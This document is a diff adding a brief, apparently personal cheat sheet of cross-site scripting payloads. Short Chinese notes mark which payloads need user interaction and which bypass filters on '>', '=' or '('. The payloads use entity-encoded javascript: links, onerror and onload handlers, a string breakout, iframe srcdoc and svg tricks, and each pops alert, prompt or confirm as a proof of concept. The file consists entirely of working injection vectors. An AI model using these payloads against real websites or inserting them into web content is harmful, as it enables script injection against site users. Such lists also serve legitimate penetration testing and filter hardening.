@@ -1,0 +1,27 @@
+<a href=java&#115;cript:alert(/a/)>click</a> 
+
+<img src="1" onerror="alert&#x28;1&#x29;"> 
+
+<svg/onload=alert&#40/1/&#41> 
+
+");alert(1);//
+ 
+var price = '111'-alert (11111);//-'';
+
+<img/src='x'/onerror=alert(1)> 
+
+<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" /> 
+
+<body oninput=alert(1)><input autofocus>  需要交互
+
+
+测试
+    -alert(1)-
+    -prompt(1)-
+    -confirm(1)-
+
+过滤了>
+<svg/onload=prompt(1)//<title>
+
+过滤了= ( 号
+<svg><script>alert&#40;1)</script>
